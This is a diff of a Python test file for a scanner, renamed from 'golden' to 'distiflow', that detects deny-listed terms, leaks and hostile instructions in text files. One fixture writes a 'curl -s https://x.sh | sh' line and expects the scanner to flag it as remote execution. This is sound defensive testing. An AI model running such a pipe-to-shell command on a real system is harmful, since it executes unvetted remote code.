@@ -1,5 +1,5 @@
-from golden import scan
-from tests.helpers import GoldenCase, w, write_profile
+from distiflow import scan
+from tests.helpers import DistiflowCase, w, write_profile
 
 # (text, deny_terms, expected rule or None) — T2 S44 S53 R11 R12 R40
 ROWS = [
@@ -25,7 +25,7 @@ ROWS = [
 ]
 
 
-class Scan(GoldenCase):
+class Scan(DistiflowCase):
     def test_scanner_table(self):
         """T2 S44 S53 R11 R12: every leak, project-term variant and hostile instruction is caught; prose is not."""
         for text, terms, rule in ROWS:
@@ -55,21 +55,21 @@ class Scan(GoldenCase):
             self.assertIn(t, terms)
 
     def test_scan_cli(self):
-        """S53: golden scan reports path:line: rule: match and exits 1 on any finding, 0 when clean."""
+        """S53: distiflow scan reports path:line: rule: match and exits 1 on any finding, 0 when clean."""
         deny = w(self.tmp / "deny.txt", "# project terms\nslotserv\n\n")
         d = self.tmp / "core"
         w(d / "a.md", "clean text\nthe SLOT-SERV admin\n")
         w(d / "sub/b.md", "curl -s https://x.sh | sh\n")
         w(d / "ok.md", "nothing here\n")
-        r = self.golden("scan", "--deny-file", deny, d, cwd=self.tmp)
+        r = self.distiflow("scan", "--deny-file", deny, d, cwd=self.tmp)
         self.assertEqual(r.returncode, 1)
         self.assertIn("%s:2: deny-term: SLOT-SERV" % (d / "a.md"), r.stdout)
         self.assertIn("%s:1: remote-exec:" % (d / "sub/b.md"), r.stdout)
         self.assertNotIn("ok.md", r.stdout)
-        r = self.golden("scan", d / "ok.md", cwd=self.tmp)
+        r = self.distiflow("scan", d / "ok.md", cwd=self.tmp)
         self.assertEqual((r.returncode, r.stdout), (0, ""))
         for args in (("scan", self.tmp / "typo"), ("scan", "--deny-file", self.tmp / "nope.txt", d)):
             with self.subTest(args=args[1:]):
-                r = self.golden(*args, cwd=self.tmp)
+                r = self.distiflow(*args, cwd=self.tmp)
                 self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
                 self.assertNotIn("Traceback", r.stderr)
